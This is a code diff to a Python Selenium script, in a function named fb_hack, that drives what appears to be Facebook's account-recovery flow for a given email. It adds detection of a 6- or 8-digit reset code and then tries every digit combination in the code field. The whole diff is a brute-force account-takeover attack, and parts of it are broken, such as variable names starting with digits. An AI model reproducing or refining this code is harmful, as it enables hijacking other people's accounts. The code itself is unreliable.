@@ -37,14 +37,23 @@ def fb_hack(email, codex, respect):
   soup = BeautifulSoup(html, 'html.parser')
   #wait = WebDriverWait(driver, 10)
   #element = wait.until(EC.visibility_of_element_located((By.ID, "element_id")))
-  search_box = driver.find_element_by_name("email")
+  search_box = driver.find_element(By.NAME, "email")
   search_box.send_keys(email)
   search_box.submit()
-  search_button = driver.find_element_by_name("tryanotherway")
+  search_button = driver.find_element(By.NAME, "tryanotherway")
   search_button.click()
   driver.submit()
   "make respect properly"
   counter = 0
+  html = driver.page_source
+  soup = BeautifulSoup(html, 'html.parser')
+  test = soup.find(string="pop")
+  6digits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
+  8digits = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
+  if 6digits != test:
+    respect = int(6)
+  else:
+    respect = int(8)
   for combination in itertools.product(["0","1","2","3","4","5","6","7","8","9"], repeat=int(respect)):
     p = (''.join(map(str, combination)))
     counter += 1
@@ -52,7 +61,7 @@ def fb_hack(email, codex, respect):
       print("working", end='\r')
     else:
       try:
-        searchbox = driver.find_element_by_name("n")
+        searchbox = driver.find_element(By.NAME, "n")
         searchbox.send_keys(p)
         searchbox.submit()
       except:
